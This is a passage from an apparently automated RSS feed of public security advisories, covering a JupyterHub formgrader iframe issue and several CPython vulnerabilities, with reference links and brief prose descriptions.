Enabling frame-ancestors: &#x27;self&#x27; grants any JupyterHub user the ability to extract formgrader content by sending malicious links to users with access to formgrader, at least when using the default JupyterHub configuration of `enable_subdomains = False`.

#1915 disables a protection which would allow user Alice to craft a page embedding formgrader in an IFrame. If Bob visits that page, his credentials will be sent and the formgrader page loaded. Because Alice&#x27;s page is on the same Origin as the formgrader iframe, Javasript on Alice&#x27;s page has _full access_ to the contents of the page served by formgrader using Bob&#x27;s credentials.

### Workarounds

- Disable `frame-ancestors: self`, or
- enable per-user and per-service subdomains with `JupyterHub.enable_subdomains = True` (then even if embedding in an IFrame is allowed, the host page does not have access to the contents of the frame).

### References

JupyterHub documentation on why and when `frame-ancestors: self` is insecure, and why it was disabled by default: https:&#x2F;&#x2F;jupyterhub.readthedocs.io&#x2F;en&#x2F;stable&#x2F;explanation&#x2F;websecurity.html#:~:text=frame-ancestors
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-python-min-2022-45061: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-python-min-2022-45061</link>
                    <pubDate>2025-01-17T15:08:25.417Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-python-min-2022-45061'>https://osv.dev/vulnerability/BIT-python-min-2022-45061</a><br>
                            <b>Published:</b> 2025-01-17T15:08:25.417Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/python/cpython/issues/98433'>https://github.com/python/cpython/issues/98433</a></li><li>- <a target='_blank' href='https://lists.debian.org/debian-lts-announce/2023/05/msg00024.html'>https://lists.debian.org/debian-lts-announce/2023/05/msg00024.html</a></li><li>- <a target='_blank' href='https://lists.debian.org/debian-lts-announce/2023/06/msg00039.html'>https://lists.debian.org/debian-lts-announce/2023/06/msg00039.html</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/2AOUKI72ACV6CHY2QUFO6VK2DNMVJ2MB/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/2AOUKI72ACV6CHY2QUFO6VK2DNMVJ2MB/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/35YDIWCUMWTMDBWFRAVENFH6BLB65D6S/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/35YDIWCUMWTMDBWFRAVENFH6BLB65D6S/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/4WBZJNSALFGMPYTINIF57HAAK46U72WQ/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/4WBZJNSALFGMPYTINIF57HAAK46U72WQ/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/63FS6VHY4DCS74HBTEINUDOECQ2X6ZCH/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/63FS6VHY4DCS74HBTEINUDOECQ2X6ZCH/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/7WQPHKGNXUJC3TC3BDW5RKGROWRJVSFR/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/7WQPHKGNXUJC3TC3BDW5RKGROWRJVSFR/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/B3YI6JYARWU6GULWOHNUROSACT54XFFS/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/B3YI6JYARWU6GULWOHNUROSACT54XFFS/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/B4MYQ3IV6NWA4CKSXEHW45CH2YNDHEPH/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/B4MYQ3IV6NWA4CKSXEHW45CH2YNDHEPH/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/BWJREJHWVRBYDP43YB5WRL3QC7UBA7BR/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/BWJREJHWVRBYDP43YB5WRL3QC7UBA7BR/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/GTPVDZDATRQFE6KAT6B4BQIQ4GRHIIIJ/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/GTPVDZDATRQFE6KAT6B4BQIQ4GRHIIIJ/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/IN26PWZTYG6IF3APLRXQJBVACQHZUPT2/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/IN26PWZTYG6IF3APLRXQJBVACQHZUPT2/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/JCDJXNBHWXNYUTOEV4H2HCFSRKV3SYL3/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/JCDJXNBHWXNYUTOEV4H2HCFSRKV3SYL3/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/JTYVESWVBPD57ZJC35G5722Q6TS37WSB/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/JTYVESWVBPD57ZJC35G5722Q6TS37WSB/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/KNE4GMD45RGC2HWUAAIGTDHT5VJ2E4O4/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/KNE4GMD45RGC2HWUAAIGTDHT5VJ2E4O4/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/LKWAMPURWUV3DCCT4J7VHRF4NT2CFVBR/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/LKWAMPURWUV3DCCT4J7VHRF4NT2CFVBR/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/O67LRHDTJWH544KXB6KY4HMHQLYDXFPK/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/O67LRHDTJWH544KXB6KY4HMHQLYDXFPK/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/ORVCQGJCCAVLN4DJDTWGREFCUWXKQRML/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/ORVCQGJCCAVLN4DJDTWGREFCUWXKQRML/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/PLQ2BNZVBBAQPV3SPRU24ZD37UYJJS7W/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/PLQ2BNZVBBAQPV3SPRU24ZD37UYJJS7W/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/QCKD4AFBHXIMHS64ZER2U7QRT33HNE7L/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/QCKD4AFBHXIMHS64ZER2U7QRT33HNE7L/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/QLUGZSEAO3MBWGKCUSMKQIRYJZKJCIOB/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/QLUGZSEAO3MBWGKCUSMKQIRYJZKJCIOB/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/RDK3ZZBRYFO47ET3N4BNTKVXN47U6ICY/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/RDK3ZZBRYFO47ET3N4BNTKVXN47U6ICY/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/RH57BNT4VQERGEJ5SXNXSVMDYP66YD4H/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/RH57BNT4VQERGEJ5SXNXSVMDYP66YD4H/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/RTN2OOLKYTG34DODUEJGT5MLC2PFGPBA/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/RTN2OOLKYTG34DODUEJGT5MLC2PFGPBA/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/T3D5TX4TDJPXHXD2QICKTY3OCQC3JARP/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/T3D5TX4TDJPXHXD2QICKTY3OCQC3JARP/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/UHVW73QZJMHA4MK7JBT7CXX7XSNYQEGF/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/UHVW73QZJMHA4MK7JBT7CXX7XSNYQEGF/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/VCMDX6IFKLOA3NXUQEV524L5LHTPI2JI/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/VCMDX6IFKLOA3NXUQEV524L5LHTPI2JI/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/X3EJ6J7PXVQOULBQZQGBXCXY6LFF6LZD/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/X3EJ6J7PXVQOULBQZQGBXCXY6LFF6LZD/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/XXZJL3CNAFS5PAIR7K4RL62S3Y7THR7O/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/XXZJL3CNAFS5PAIR7K4RL62S3Y7THR7O/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/YPNWZKXPKTNHS5FVMN7UQZ2UPCSEFJUK/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/YPNWZKXPKTNHS5FVMN7UQZ2UPCSEFJUK/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/ZB5YCMIRVX35RUB6XPOWKENCVCJEVDRK/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/ZB5YCMIRVX35RUB6XPOWKENCVCJEVDRK/</a></li><li>- <a target='_blank' href='https://security.gentoo.org/glsa/202305-02'>https://security.gentoo.org/glsa/202305-02</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20221209-0007/'>https://security.netapp.com/advisory/ntap-20221209-0007/</a></li></ul><br>
                            <b>Details:</b> <b></b><br>An issue was discovered in Python before 3.11.1. An unnecessary quadratic algorithm exists in one path when processing some inputs to the IDNA (RFC 3490) decoder, such that a crafted, unreasonably long name being presented to the decoder could lead to a CPU denial of service. Hostnames are often supplied by remote servers that could be controlled by a malicious actor; in such a scenario, they could trigger excessive CPU consumption on the client attempting to make use of an attacker-supplied supposed hostname. For example, the attack payload could be placed in the Location header of an HTTP response with status code 302. A fix is planned in 3.11.1, 3.10.9, 3.9.16, 3.8.16, and 3.7.16.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-python-min-2023-27043: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-python-min-2023-27043</link>
                    <pubDate>2025-01-17T15:07:38.407Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-python-min-2023-27043'>https://osv.dev/vulnerability/BIT-python-min-2023-27043</a><br>
                            <b>Published:</b> 2025-01-17T15:07:38.407Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='http://python.org'>http://python.org</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/issues/102988'>https://github.com/python/cpython/issues/102988</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/4ZAEFSFZDNBNJPNOUTLG5COISGQDLMGV/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/4ZAEFSFZDNBNJPNOUTLG5COISGQDLMGV/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/75DTHSTNOFFNAWHXKMDXS7EJWC6W2FUC/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/75DTHSTNOFFNAWHXKMDXS7EJWC6W2FUC/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/ARI7VDSNTQVXRQFM6IK5GSSLEIYV4VZH/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/ARI7VDSNTQVXRQFM6IK5GSSLEIYV4VZH/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/BQAKLUJMHFGVBRDPEY57BJGNCE5UUPHW/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/BQAKLUJMHFGVBRDPEY57BJGNCE5UUPHW/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/HXYVPEZUA3465AEFX5JVFVP7KIFZMF3N/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/HXYVPEZUA3465AEFX5JVFVP7KIFZMF3N/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/N6M5I6OQHJABNEYY555HUMMKX3Y4P25Z/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/N6M5I6OQHJABNEYY555HUMMKX3Y4P25Z/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/NEUNZSZ3CVSM2QWVYH3N2XGOCDWNYUA3/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/NEUNZSZ3CVSM2QWVYH3N2XGOCDWNYUA3/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/ORLXS5YTKN65E2Q2NWKXMFS5FWQHRNZW/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/ORLXS5YTKN65E2Q2NWKXMFS5FWQHRNZW/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/P2MAICLFDDO3QVNHTZ2OCERZQ34R2PIC/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/P2MAICLFDDO3QVNHTZ2OCERZQ34R2PIC/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/P2W2BZQIHMCKRI5FNBJERFYMS5PK6TAH/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/P2W2BZQIHMCKRI5FNBJERFYMS5PK6TAH/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/PHVGRKQAGANCSGFI3QMYOCIMS4IFOZA5/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/PHVGRKQAGANCSGFI3QMYOCIMS4IFOZA5/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/PU6Y2S5CBN5BWCBDAJFTGIBZLK3S2G3J/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/PU6Y2S5CBN5BWCBDAJFTGIBZLK3S2G3J/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/QDRDDPDN3VFIYXJIYEABY6USX5EU66AG/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/QDRDDPDN3VFIYXJIYEABY6USX5EU66AG/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/RDDC2VOX7OQC6OHMYTVD4HLFZIV6PYBC/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/RDDC2VOX7OQC6OHMYTVD4HLFZIV6PYBC/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/SINP4OVYNB2AGDYI2GS37EMW3H3F7XPZ/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/SINP4OVYNB2AGDYI2GS37EMW3H3F7XPZ/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/SOX7BCN6YL7B3RFPEEXPIU5CMTEHJOKR/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/SOX7BCN6YL7B3RFPEEXPIU5CMTEHJOKR/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/VZXC32CJ7TWDPJO6GY2XIQRO7JZX5FLP/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/VZXC32CJ7TWDPJO6GY2XIQRO7JZX5FLP/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/XWMBD4LNHWEXRI6YVFWJMTJQUL5WOFTS/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/XWMBD4LNHWEXRI6YVFWJMTJQUL5WOFTS/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/YQVY5C5REXWJIORJIL2FIL3ALOEJEF72/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/YQVY5C5REXWJIORJIL2FIL3ALOEJEF72/</a></li><li>- <a target='_blank' href='https://python-security.readthedocs.io/vuln/email-parseaddr-realname.html'>https://python-security.readthedocs.io/vuln/email-parseaddr-realname.html</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20230601-0003/'>https://security.netapp.com/advisory/ntap-20230601-0003/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/4ZAEFSFZDNBNJPNOUTLG5COISGQDLMGV/'>https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/4ZAEFSFZDNBNJPNOUTLG5COISGQDLMGV/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/75DTHSTNOFFNAWHXKMDXS7EJWC6W2FUC/'>https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/75DTHSTNOFFNAWHXKMDXS7EJWC6W2FUC/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ARI7VDSNTQVXRQFM6IK5GSSLEIYV4VZH/'>https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ARI7VDSNTQVXRQFM6IK5GSSLEIYV4VZH/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/BQAKLUJMHFGVBRDPEY57BJGNCE5UUPHW/'>https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/BQAKLUJMHFGVBRDPEY57BJGNCE5UUPHW/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/HXYVPEZUA3465AEFX5JVFVP7KIFZMF3N/'>https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/HXYVPEZUA3465AEFX5JVFVP7KIFZMF3N/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/N6M5I6OQHJABNEYY555HUMMKX3Y4P25Z/'>https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/N6M5I6OQHJABNEYY555HUMMKX3Y4P25Z/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/NEUNZSZ3CVSM2QWVYH3N2XGOCDWNYUA3/'>https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/NEUNZSZ3CVSM2QWVYH3N2XGOCDWNYUA3/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ORLXS5YTKN65E2Q2NWKXMFS5FWQHRNZW/'>https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ORLXS5YTKN65E2Q2NWKXMFS5FWQHRNZW/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/P2MAICLFDDO3QVNHTZ2OCERZQ34R2PIC/'>https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/P2MAICLFDDO3QVNHTZ2OCERZQ34R2PIC/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/P2W2BZQIHMCKRI5FNBJERFYMS5PK6TAH/'>https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/P2W2BZQIHMCKRI5FNBJERFYMS5PK6TAH/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/PHVGRKQAGANCSGFI3QMYOCIMS4IFOZA5/'>https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/PHVGRKQAGANCSGFI3QMYOCIMS4IFOZA5/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/PU6Y2S5CBN5BWCBDAJFTGIBZLK3S2G3J/'>https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/PU6Y2S5CBN5BWCBDAJFTGIBZLK3S2G3J/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/QDRDDPDN3VFIYXJIYEABY6USX5EU66AG/'>https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/QDRDDPDN3VFIYXJIYEABY6USX5EU66AG/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/RDDC2VOX7OQC6OHMYTVD4HLFZIV6PYBC/'>https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/RDDC2VOX7OQC6OHMYTVD4HLFZIV6PYBC/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/SINP4OVYNB2AGDYI2GS37EMW3H3F7XPZ/'>https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/SINP4OVYNB2AGDYI2GS37EMW3H3F7XPZ/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/VZXC32CJ7TWDPJO6GY2XIQRO7JZX5FLP/'>https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/VZXC32CJ7TWDPJO6GY2XIQRO7JZX5FLP/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/XWMBD4LNHWEXRI6YVFWJMTJQUL5WOFTS/'>https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/XWMBD4LNHWEXRI6YVFWJMTJQUL5WOFTS/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/YQVY5C5REXWJIORJIL2FIL3ALOEJEF72/'>https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/YQVY5C5REXWJIORJIL2FIL3ALOEJEF72/</a></li></ul><br>
                            <b>Details:</b> <b></b><br>The email module of Python through 3.11.3 incorrectly parses e-mail addresses that contain a special character. The wrong portion of an RFC2822 header is identified as the value of the addr-spec. In some applications, an attacker can bypass a protection mechanism in which application access is granted only after verifying receipt of e-mail to a specific domain (e.g., only @company.example.com addresses may be used for signup). This occurs in email&#x2F;_parseaddr.py in recent versions of Python.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-python-min-2023-41105: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-python-min-2023-41105</link>
                    <pubDate>2025-01-17T15:07:02.719Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-python-min-2023-41105'>https://osv.dev/vulnerability/BIT-python-min-2023-41105</a><br>
                            <b>Published:</b> 2025-01-17T15:07:02.719Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/python/cpython/issues/106242'>https://github.com/python/cpython/issues/106242</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/pull/107981'>https://github.com/python/cpython/pull/107981</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/pull/107982'>https://github.com/python/cpython/pull/107982</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/pull/107983'>https://github.com/python/cpython/pull/107983</a></li><li>- <a target='_blank' href='https://mail.python.org/archives/list/security-announce%40python.org/thread/D6CDW3ZZC5D444YGL3VQUY6D4ECMCQLD/'>https://mail.python.org/archives/list/security-announce%40python.org/thread/D6CDW3ZZC5D444YGL3VQUY6D4ECMCQLD/</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20231006-0015/'>https://security.netapp.com/advisory/ntap-20231006-0015/</a></li></ul><br>
                            <b>Details:</b> <b></b><br>An issue was discovered in Python 3.11 through 3.11.4. If a path containing &#x27;\0&#x27; bytes is passed to os.path.normpath(), the path will be truncated unexpectedly at the first &#x27;\0&#x27; byte. There are plausible cases in which an application would have rejected a filename for security reasons in Python 3.10.x or earlier, but that filename is no longer rejected in Python 3.11.x.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-python-min-2023-6507: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-python-min-2023-6507</link>
                    <pubDate>2025-01-17T15:06:54.411Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-python-min-2023-6507'>https://osv.dev/vulnerability/BIT-python-min-2023-6507</a><br>
                            <b>Published:</b> 2025-01-17T15:06:54.411Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/python/cpython/commit/10e9bb13b8dcaa414645b9bd10718d8f7179e82b'>https://github.com/python/cpython/commit/10e9bb13b8dcaa414645b9bd10718d8f7179e82b</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/85bbfa8a4bbdbb61a3a84fbd7cb29a4096ab8a06'>https://github.com/python/cpython/commit/85bbfa8a4bbdbb61a3a84fbd7cb29a4096ab8a06</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/9fe7655c6ce0b8e9adc229daf681b6d30e6b1610'>https://github.com/python/cpython/commit/9fe7655c6ce0b8e9adc229daf681b6d30e6b1610</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/issues/112334'>https://github.com/python/cpython/issues/112334</a></li><li>- <a target='_blank' href='https://mail.python.org/archives/list/security-announce@python.org/thread/AUL7QFHBLILGISS7U63B47AYSSGJJQZD/'>https://mail.python.org/archives/list/security-announce@python.org/thread/AUL7QFHBLILGISS7U63B47AYSSGJJQZD/</a></li></ul><br>
                            <b>Details:</b> <b></b><br>An issue was found in CPython 3.12.0 `subprocess` module on POSIX platforms. The issue was fixed in CPython 3.12.1 and does not affect other stable releases.When using the `extra_groups=` parameter with an empty list as a value (ie `extra_groups=[]`) the logic regressed to not call `setgroups(0, NULL)` before calling `exec()`, thus not dropping the original processes&#x27; groups before starting the new process. There is no issue when the parameter isn&#x27;t used or when any value is used besides an empty list.This issue only impacts CPython processes run with sufficient privilege to make the `setgroups` system call (typically `root`).
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-python-min-2023-6597: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-python-min-2023-6597</link>
                    <pubDate>2025-01-17T15:06:45.103Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-python-min-2023-6597'>https://osv.dev/vulnerability/BIT-python-min-2023-6597</a><br>
                            <b>Published:</b> 2025-01-17T15:06:45.103Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
